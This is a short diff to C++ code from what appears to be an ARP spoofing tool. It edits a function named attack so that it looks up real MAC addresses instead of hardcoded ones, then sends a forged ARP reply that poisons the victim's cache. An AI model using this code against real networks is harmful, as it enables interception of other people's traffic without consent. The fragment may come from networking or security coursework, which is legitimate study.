@@ -132,11 +132,11 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
   Ip target_ip = Ip(_target_ip);
   Ip sender_ip = Ip(_sender_ip);
   cout << "target: " << string(target_ip) << " sender: " << string(sender_ip) << '\n';
-  // Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
-  // Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
+  Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
+  Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
   
-  Mac sender_mac = Mac("7C:10:C9:D2:82:96");
-  Mac target_mac = Mac("00:23:AA:79:8C:9C");
+  // Mac sender_mac = Mac("7C:10:C9:D2:82:96");
+  // Mac target_mac = Mac("00:23:AA:79:8C:9C");
 
   cout << "[" << pid << "] " << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
   send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
